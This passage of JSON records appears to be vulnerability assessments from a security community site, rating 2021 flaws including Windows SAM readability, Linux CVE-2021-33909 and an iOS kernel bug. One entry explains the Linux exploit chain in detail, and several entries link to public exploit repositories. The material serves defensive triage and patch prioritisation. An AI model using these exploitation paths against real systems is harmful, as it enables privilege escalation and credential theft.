      "document": "Zero-day LPE vulnerability affecting Windows 10 v1809 and later (so Win10 and Win11 preview), arises from SAM file's being READ-enabled for all local users. SAM file has gold, e.g., hashed user/admin passwords. PoC to retrieve registry hives publicly available, no patch as of July 21, 2021. JonasLyk and research community reported and confirmed the issue on Twitter Monday, July 19. Guidance from Microsoft is to apply a couple of workarounds\u2014defenders likely behind the attack curve already. Details: https://www.rapid7.com/blog/post/2021/07/21/microsoft-sam-file-readability-cve-2021-36934-what-you-need-to-know/",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "08f486f0-bc7d-42e5-bc72-f080d49d29e8",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "9adf44d2-fa0d-4643-8b97-8b46983b6917",
      "created": "2021-07-22T16:35:53.368338Z",
      "revisionDate": "2021-07-26T15:49:06.72715Z",
      "document": "I looked at the patch briefly and confirmed this appears to be unauthenticated remote code execution, specifically of the memory corruption variety, in the SSH (SFTP) service that's available to Serv-U. Note that services are opt-in for this product, so SSH would need to be enabled for this bug to be exploitable. However, since this vulnerability is being exploited in the wild (albeit in targeted attacks), you'll absolutely want to patch it, particularly for a product that is likely to be exposed to the Internet.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "7165e930-ab88-4f93-bd6e-c2d2b2ac0df5",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "62f348fd-32bc-4c70-b5ad-6389966329c5",
      "created": "2021-07-22T16:40:21.23391Z",
      "revisionDate": "2021-07-30T05:54:15.660091Z",
      "document": "_(Edited for clarity only.)_\r\n\r\n**Update:** Paolo Stagno ([VoidSec](https://twitter.com/Void_Sec)) has analyzed this vulnerability and posited that [it is not exploitable beyond DoS](https://twitter.com/Void_Sec/status/1419989126175199246). I agree with their analysis and have updated my ratings as a result. My pre-analysis assessment is preserved below. ~~More details to come!~~ Please see [VoidSec's assessment](https://attackerkb.com/assessments/7a5791e2-ece7-445f-9205-f8bb634bb69b). :)\r\n\r\n---\r\n\r\nLocal privilege escalation in an ancient yet widely distributed printer driver for Windows. Mis-bounded `strncpy()` buffer overflow in kernel space, so exploitation requires skill and precision to pull off, though the vulnerability itself is incredibly straightforward. Could be a reliable root for years to come. Patch this normally and don't freak out.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "bdb7384b-49db-46a2-860e-51ce33d465c2",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "bdb14d8f-14c7-42b3-814a-12ce7826bf04",
      "created": "2021-07-22T22:34:47.551086Z",
      "revisionDate": "2024-05-29T07:16:54.368347Z",
      "document": "Atlassian disclosed a remote code execution (RCE) vulnerability affecting multiple versions of Jira Data Center, Jira Core Data Center, Jira Software Data Center and Jira Service Data Center.\r\nThreat actors with access to ports 40001 and 40011 (Ehcache RMI ports) could execute arbitrary code, due to a missing authentication flaw in Jira\u2019s deployment .\r\nhttps://confluence.atlassian.com/adminjiraserver/jira-data-center-and-jira-service-management-data-center-security-advisory-2021-07-21-1063571388.html#JiraDataCenterAndJiraServiceManagementDataCenterSecurityAdvisory20210721-Mitigation",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "cf549649-27bd-47cd-ae9e-3016d4eb82f5",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "6ba1ea9c-84d0-4a70-a858-8d5fcc65962d",
      "created": "2021-07-23T05:43:45.007494Z",
      "revisionDate": "2021-07-26T23:29:09.780592Z",
      "document": "CVE-2021-33909 has high attacker value because it is root privilege escalation in core functionality of the Linux kernel itself. Exploitability is a little lower, since it involves kernel memory corruption with particular requirements, but Qualys has indicated successful exploitation of several Linux distributions and versions, noting that distributions they haven't tested may be equally exploitable out of the box. Mitigations do exist but do not fix the root cause. You'll want to patch this one before a full exploit drops. (A crash PoC has already been released.)",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7451dd38-a6e6-48fc-b850-b8f719bbd4ed",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "e0d18527-bfc2-4116-87d8-040cc4d96bc8",
      "created": "2021-07-23T21:42:42.581106Z",
      "revisionDate": "2021-07-23T21:42:42.580242Z",
      "document": "Stored and Reflected XSS Vulnerability in Nagios Log Server. Actors could execute malicious JavaScript on targets machines such as stealing cookies or redirecting users.\r\nPoC is publicly available\r\nhttps://attackerkb.com/topics/GWZl4INBU4/cve-2021-35479?referrer=search",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "dea5100c-e2a8-4544-bd48-41c443595c87",
      "editorId": "04e0a3a0-9153-4d1a-899a-6b367f6b1ed0",
      "topicId": "68c898aa-7786-44eb-aa49-bdce98588d8c",
      "created": "2021-07-25T09:35:54.652891Z",
      "revisionDate": "2021-07-29T17:30:04.061266Z",
      "document": "Vulnerability is easy to exploit - by interacting with the local ShadowCopy volume, and copying it to a local folder, attackers can easily elevate their privileges.\r\nSeveral exploits were already released, allowing to parse the hashes while copying the SAM\\SECURITY\\SYSTEM hives:\r\nhttps://github.com/cube0x0/CVE-2021-36934\r\nhttps://github.com/HuskyHacks/ShadowSteal \r\n\r\nThis vulnerability occurs due to the permissive \"C:\\Windows\\System32\\Config\\*.*\" privileges, \"BUILTIN\\Users\", allowing any user to read and execute the files.\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "b29a9bf5-74b4-4b2c-b67f-489888ed40d1",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "6ba1ea9c-84d0-4a70-a858-8d5fcc65962d",
      "created": "2021-07-27T00:16:10.790713Z",
      "revisionDate": "2021-07-27T00:27:35.920566Z",
      "document": "# TLDR Version\r\n- `size_t` to `int` conversion vulnerability leading to an integer overflow in the Linux kernel's filesystem layer.\r\n- Exploitable by creating, mounting, and deleting a deep directory structure whose total path length exceeds 1 GB.\r\n- Exploiting it allows an attacker to write the string `//deleted` to an offset of exactly -2GB-10B (-10B cause the length of `//deleted` is 10 bytes if you include the NULL terminator) below the beginning of a `vmalloc()` allocated kernel buffer.\r\n- Exploit the uncontrolled OOB write to obtain full `root` privileges on default installations of Ubuntu 20.04, Ubuntu 20.10, Ubuntu 21.04, Debian 11, Fedora 34 Workstation. Though with that being said other Linux distributions are vulnerable and likely exploitable.\r\n- Exploit requires about 5GB of memory and 1M inodes, and exploit will be published by Qualys sometime in near future according to their blog.\r\n- Vulnerability introduced in July 2014 (Linux 3.16) by commit 058504ed (\"fs/seq_file: fallback to vmalloc allocation\"), was fixed with https://github.com/torvalds/linux/commit/8cae8cd89f05f6de223d63e6d15e31c8ba9cf53b in Linux kernel 5.13.4.\r\n\r\n# Preliminary Warning :)\r\nThis commentary may get a bit technical as that is my preferred style of writing so if you want the nutshell version take a look at @NinjaOperator or @wvu-r7's reviews on this for a nutshell version or look at the TLDR section above if you need the pertinent details and aren't interested in a deeper dive into this bug (you'll miss out on some good info though :D) Alright, ready? Lets dive into this bug. \r\n\r\n# Exploit Background and Some History\r\nSo according to Qualys this bug was first introduced in July 2014 (Linux 3.16) by commit 058504ed (\"fs/seq_file: fallback to vmalloc allocation\") which can be found at https://gitlab.raptorengineering.com/meklort/talos-obmc-linux/-/commit/058504edd02667eef8fac9be27ab3ea74332e9b4. This was when original `kmalloc(m->size <<= 1, GFP_KERNEL);` call was switched to a `seq_buf_alloc(m->size <<= 1);` call. \r\n\r\nThis is interesting as when we look at the earlier source code for `kmalloc` from say, version 3.15 of the Linux source code we find that the maximum size of memory that `kmalloc` can allocate is noted at https://elixir.bootlin.com/linux/v3.15/source/include/linux/slab.h#L455 as `KMALLOC_MAX_CACHE_SIZE`. This is defined at https://elixir.bootlin.com/linux/v3.15/source/include/linux/slab.h#L234 as `#define KMALLOC_MAX_CACHE_SIZE\t(1UL << KMALLOC_SHIFT_HIGH)` or the unsigned number `1` left shifted by `KMALLOC_SHIFT_HIGH`. `KMALLOC_SHIFT_HIGH` is defined multiple ways, depending on the backend allocator in use by the OS, but its either defined as a max of 25 (for SLAB allocators), `PAGESHIFT`, which is defined as 12 for x86/x64 systems, or `PAGESHIFT`+1 aka 13. \r\n\r\nOr in other words to make a long story story, the maximum size that `kmalloc()` may allocate is 32 MB aka `1<<25`. This is far below what can be represented by a 32 bit number. However when the kernel changed to calling `seq_buf_alloc()` it now calls `vmalloc` as can be seen at https://elixir.bootlin.com/linux/v3.16/source/fs/seq_file.c#L41, which does not have this same limitation and can allocate as much memory as it pleases. Which means that size could technically be a number that is larger than what can be represented by a signed 32 bit integer.\r\n\r\nThis leads us into the actual code itself, which I'll explain below.\r\n\r\n# The Vulnerable Code Explanation\r\nThe Linux kernel has a `seq_file` interface that produces virtual files that contain sequences of records. Each record must fit into a `seq_file` buffer, whose size is increased as needed by doubling its size by freeing the existing allocation, and then doing a new `seq_buf_alloc()` call where the size is the previous size bit shifted left by 1, effectively doubling the size allocated. We can see this if we take a look at https://elixir.bootlin.com/linux/v5.13.3/source/fs/seq_file.c#L242, though the relevant parts of the code are shown below:\r\n\r\n```c++\r\n 168 ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)\r\n 169 {\r\n 170         struct seq_file *m = iocb->ki_filp->private_data;\r\n ...\r\n 205         /* grab buffer if we didn't have one */\r\n 206         if (!m->buf) {\r\n 207                 m->buf = seq_buf_alloc(m->size = PAGE_SIZE);\r\n ...\r\n 210         }\r\n ...\r\n 220         // get a non-empty record in the buffer\r\n ...\r\n 223         while (1) {\r\n ...\r\n 227                 err = m->op->show(m, p);\r\n ...\r\n 236                 if (!seq_has_overflowed(m)) // got it\r\n 237                         goto Fill;\r\n 238                 // need a bigger buffer\r\n ...\r\n 240                 kvfree(m->buf);\r\n ...\r\n 242                 m->buf = seq_buf_alloc(m->size <<= 1);\r\n ...\r\n 246         }\r\n```\r\nNote that the `m` is the `seq_read_iter()` function is a `seq_file` structure corresponding to the path to the virtual file that we are currently operating on. Anyway now that we have allocated memory the next question might be \"well if we can control m->size, couldn't we do an overflow here?\" Well not really as Qualys notes cause either the allocation will fail, or you will run out of memory before you overflow `m->size` since it is of type `size_t` as noted at https://elixir.bootlin.com/linux/v5.13.3/source/include/linux/seq_file.h#L18.\r\n\r\nThe problem however is that `m->size` is actually used in functions that expect an `int` value, aka a signed 32 bit integer, not `size_t`, a 64 bit unsigned integer. Which leads us to the function `show()` at https://elixir.bootlin.com/linux/v5.13.3/source/fs/seq_file.c#L269, which according to Qualys ends up calling `show_mountinfo()`.\r\n\r\nYou see `show_mountinfo()`, will end up calling `seq_dentry(m, mnt->mnt_root, \" \\t\\n\\\\\");` as shown at https://elixir.bootlin.com/linux/v5.13.3/source/fs/proc_namespace.c#L150. Note that `m` here will be the `seq_file` object containing a `buf` pointer to the buffer we allocated earlier. `seq_dentry()` then gets the size of the allocate buffer that `m->buf` points to, aka the buffer we allocated earlier, and sets the local variable `size` to its size as can be seen at https://elixir.bootlin.com/linux/v5.13.3/source/fs/seq_file.c#L544. Note however that `size` is of type `size_t`, aka an unsigned 64 bit number\r\n\r\nAnd this is where things go really wrong, as `dentry_path(dentry, buf, size);` is then called which leads to the code starting at https://elixir.bootlin.com/linux/v5.13.3/source/fs/d_path.c#L385. Note however that `dentry_path` expects its `size` argument to be an `int`, aka a signed 32 bit integer though, yet we passed it a `size_t` number. So if we allocated a buffer 2GB or greater, aka 2147483648 or greater, this would overflow the limits of a signed 32 bit integer, as signed 32 bit numbers can only represent numbers in the range -2147483648 to 2147483647. So in effect the number 2147483648 in `size` would be converted inside `dentry_path` to the value -2147483648. Woops!\r\n\r\nThis then leads to `p = buf + buflen;` pointing to the location of the allocated buffer, aka `buf` minus `buflen` which will now be -2147483648 assuming the that `size` was specified as 2GB aka 2147483648. So `p` will in effect point to a memory location 2GB *before* where our `vmalloc()` allocated buffer is.\r\n\r\nWe then end up calling `prepend(&p, &buflen, \"//deleted\", 10)`, and we can see the code for `prepend` at https://elixir.bootlin.com/linux/v5.13.3/source/fs/d_path.c#L11, thought the interesting part starts at https://elixir.bootlin.com/linux/v5.13.3/source/fs/d_path.c#L16. Here we can see that `buffer`, aka the pointer to the memory at 2GB *before* the `vmalloc()` allocated buffer, is subtracted by 10, making it point an additional 10 bytes earlier in memory. Following this 10 bytes of the `//deleted` string, aka the `//deleted` string plus the null terminator is written to memory.\r\n\r\nThis effectively allows the attacker to gain an OOB write in kernel memory as they can adjust the length of the string allocated to adjust where they write in memory. Now typically this wouldn't lead to much however Qualys was able to use this OOB write to overwrite the instruction of the validated eBPF program after it has been validated by the kernel but before it has been JIT compiled, and use this to transform the uncontrolled OOB write into and information disclosure and then in to a limited but controlled OOB write. Then then used Manfred Paul's `btf` and `map_push_elem` techniques from https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification to transform this limited controlled OOB write into a full arbitrary kernel read and write and used this to set `modprobe_path` to their current executable, a technique that has been described in more detail than I can describe here in places like https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/, to elevate their current process such that it now executes code in kernel mode as `root`.\r\n\r\n# Official Patch And Some Important Notes\r\nhttps://github.com/torvalds/linux/commit/8cae8cd89f05f6de223d63e6d15e31c8ba9cf53b is the official patch for this issue, which fixes the issue by ensuring that `seq_buf_alloc` doesn't allocate memory that is larger than `MAX_RW_COUNT`. Looking at where `MAX_RW_COUNT` is defined we see https://elixir.bootlin.com/linux/v5.13.4/source/include/linux/fs.h#L2572 where it is defined as `#define MAX_RW_COUNT (INT_MAX & PAGE_MASK)`. This basically page aligns `INT_MAX` to a page so the max value allowed will be the value of `INT_MAX`, which is the maximum value of a signed 32 bit integer, minus the size of a page of memory on the system, which is typically 4KB in size.\r\n\r\nIf the size is over this amount then the allocation will fail and we will never hit the vulnerable code. However this doesn't really solve the root issue per say. Assuming users can find another way to execute the same vulnerable code and abuse the fact that the kernel is still passing unsigned 64 bit integers to functions that expect signed 32 bit integers, its likely that someone could bypass this patch via alternative means. Whether or not this is possible remains to be seen, but in my opinion, whilst it would be more work, the appropriate solution would be update the functions to pass the appropriate data into one another whilst also taking care to not perform casts between signed and unsigned numbers without performing appropriate checks.\r\n",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "67036e91-d993-4343-9216-540bcf5c34e6",
      "editorId": "5b9afbc1-16ec-4b23-a5ff-ab98d7830129",
      "topicId": "13d7a136-347d-489a-908c-898f80e4b285",
      "created": "2021-07-27T11:57:10.332245Z",
      "revisionDate": "2021-07-29T16:02:17.8385Z",
      "document": "Apple is aware of a report that this issue may have been actively exploited.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1e49286c-753e-4576-ae99-dbd3bb18271e",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "13d7a136-347d-489a-908c-898f80e4b285",
      "created": "2021-07-27T13:48:40.267517Z",
      "revisionDate": "2021-07-29T16:02:05.59588Z",
      "document": "Vulnerability is a WebContent->EL1 local privilege elevation vulnerability in Apple iOS and iPadOS prior to 14.7.1 that exploits a vulnerability in the `IOMobileFramebufferLegacy::get_displayed_surface()` function whereby an attacker can control a 32 bit value that is being used to index into an array in order to cause an out of bound read. This can then be used to read the port name of an IOSurface object. Once this information is obtained, the attacker can then use known read/write primitives within the IOSurface object to gain the arbitrary kernel read/write they need to elevate their privileges. More details can be found at https://saaramar.github.io/IOMobileFrameBuffer_LPE_POC/ along with a working PoC.\r\n\r\nIt should be noticed that Apple has supposedly stated this was exploited in the wild according to https://support.apple.com/en-us/HT212623 however from what I've heard Apple has stated jailbreak exploits were \"exploited in the wild\" and there are rumors that this was perhaps just used by people in private to jailbreak their phones, so I'd take Apple's word with a slight grain of salt. That being said the impact should be considered the same regardless given the relative ease of exploitation of this vulnerability combined with the fact that a working PoC has now been published.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "7a5791e2-ece7-445f-9205-f8bb634bb69b",
      "editorId": "769a207c-ca81-467c-8bcb-673ea74bfb6b",
      "topicId": "62f348fd-32bc-4c70-b5ad-6389966329c5",
      "created": "2021-07-28T14:46:11.398121Z",
      "revisionDate": "2021-07-29T16:15:48.774975Z",
      "document": "Here you can read the entire analysis: **https://voidsec.com/root-cause-analysis-of-cve-2021-3438/**\r\nThe vulnerable function `sub_15070` copies bytes from the user\u2019s input buffer via the `strncpy` function call with an arbitrary size parameter (controlled by the user), causing a buffer overflow. The buffer, initialized with all zeroes in the `.data` segment, is the only reference in all of the section and it is only used in the highlighted `strncpy` operation; **there are no pointers nor interesting structures** written inside the segement **that we can corrupt to redirect the execution flow**. \r\nI can confidently say that this vulnerability can, at best, be used to perform a **local Denial of Service** (DoS) crashing the entire OS.\r\n I think a more appropriate CVSS score is **[6.5](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H/E:H/RL:O/RC:C)**, rather than the arbitrary 8.8/10 score given to the original CVE.\r\n\r\nThx to @wvu-r7 for the peer review.",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "fa06271b-85bc-44fe-bccc-3857dd418fcb",
      "editorId": "04e0a3a0-9153-4d1a-899a-6b367f6b1ed0",
      "topicId": "7f852d84-c725-46cf-9b3e-e27cf0e549e0",
      "created": "2021-08-04T14:19:01.544337Z",
      "revisionDate": "2021-08-13T14:13:36.28908Z",
      "document": "As Cobalt Strike's source code got leaked in November 2020, it seems that versions 4.2 and 4.3 are both vulnerable to a Denial of Service attack that occurs when a new beacon registers with the Teamserver, thus causing a memory load and server crash.\r\nThe attacker need to the know the relevant beacon configuration prior to the execution, but this can be done rather easily with a multitude of tools released over GitHub, that performs config extraction from known Cobalt Strike C2 servers.\r\nCobalt Strike has become a tool which is used commonly by different threat actor groups worldwide, due to its availability, capabilities and effectiveness in covert channels.\r\n\r\nSentinel One have researched, reported and released a PoC code that triggers this vulnerability:\r\nhttps://labs.sentinelone.com/hotcobalt-new-cobalt-strike-dos-vulnerability-that-lets-you-halt-operations/\r\n\r\nAs the PoC code got released, it is safe to assume that vulnerable C2 servers worldwide are being attacked.\r\n\r\nTo fix this issue, version 4.4 was released.\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "37b0fa9b-7695-4e08-a613-18765615dd3d",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "52f87a95-98df-4c49-8a5c-c779282aa910",
      "created": "2021-08-06T17:37:51.696238Z",
      "revisionDate": "2021-08-13T14:13:25.994327Z",
      "document": "OneNav beta 0.9.12 allows XSS via the Add Link feature. PWNED by using remote execution script, automated for this vulnerability. NOTE: the vendor's position is that there intentionally is not any XSS protection at present, because the attack risk is largely limited to a compromised account; however, XSS protection is planned for a future release.\r\n# More:\r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-38138\r\n# Proof:\r\nhttps://streamable.com/ubtzio\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "d5b1c7e6-652b-4f9d-b0a4-bbe9a14a81cb",
      "editorId": "22074154-5a0d-4a4e-ab29-9174bce3d2f6",
      "topicId": "6b97ea77-ac79-464e-bd34-554011181572",
      "created": "2021-08-08T16:18:10.256814Z",
      "revisionDate": "2021-08-20T14:40:17.495415Z",
      "document": "Considere la posibilidad de implementar planes de recuperaci\u00f3n ante desastres de TI que contengan procedimientos para realizar copias de seguridad de datos peri\u00f3dicas que se puedan utilizar para restaurar los datos de la organizaci\u00f3n. [28] Aseg\u00farese de que las copias de seguridad se almacenen fuera del sistema y est\u00e9n protegidas de los m\u00e9todos comunes que los adversarios pueden utilizar para obtener acceso y destruir las copias de seguridad para evitar la recuperaci\u00f3n.\r\n\r\nConsidere los controles t\u00e9cnicos para evitar la desactivaci\u00f3n de servicios o la eliminaci\u00f3n de archivos involucrados en la recuperaci\u00f3n del sistema.\r\n\r\nde igual manera se sabe que este tipo de t\u00e9cnica de ataque no se puede mitigar f\u00e1cilmente con controles preventivos ya que se basa en el abuso de funciones del sistema.\r\n\r\nSe opta por la detecci\u00f3n\r\n\r\nDetectar la acci\u00f3n de desofuscar o decodificar archivos o informaci\u00f3n puede resultar dif\u00edcil dependiendo de la implementaci\u00f3n. Si la funcionalidad est\u00e1 contenida en malware y usa la API de Windows, entonces intentar detectar un comportamiento malicioso antes o despu\u00e9s de la acci\u00f3n puede producir mejores resultados que intentar realizar un an\u00e1lisis en bibliotecas cargadas o llamadas a API. Si se utilizan scripts, es posible que sea necesario recopilar los scripts para el an\u00e1lisis. Realice una supervisi\u00f3n de procesos y de la l\u00ednea de comandos para detectar comportamientos potencialmente maliciosos relacionados con los scripts y las utilidades del sistema, como certutil .\r\n\r\nSupervise las rutas de los archivos de ejecuci\u00f3n y los argumentos de la l\u00ednea de comandos para las aplicaciones y extensiones de archivos de almacenamiento comunes, como las de las herramientas de archivo Zip y RAR, y correlacione con otros comportamientos sospechosos para reducir los falsos positivos del comportamiento normal del usuario y el administrador.\r\n\r\nMitigaciones fabricante\r\nLa mitigaci\u00f3n para este problema no est\u00e1 disponible o las opciones disponibles actualmente no cumplen con los criterios de seguridad de productos tampoco la facilidad de uso e implementaci\u00f3n, aplicabilidad a una base de instalaci\u00f3n generalizada o estabilidad.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "cfa19a56-453e-4107-af03-a7d86c28ece8",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "d274924a-0697-4af3-869a-34844fc6cd0e",
      "created": "2021-08-09T13:20:52.667292Z",
      "revisionDate": "2021-08-09T13:28:30.867114Z",
